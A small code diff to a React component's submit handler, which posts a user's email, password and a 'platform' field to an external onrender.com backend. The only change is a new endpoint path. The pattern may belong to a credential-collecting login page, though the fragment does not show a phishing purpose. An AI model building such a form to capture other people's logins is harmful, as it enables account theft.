@@ -20,7 +20,7 @@ function Home(){
         e.preventDefault();
     
         try {
-            const response = await axios.post('https://myrootbackendone.onrender.com', {
+            const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
                 email:email,
                 password:password,
                 platform:platform
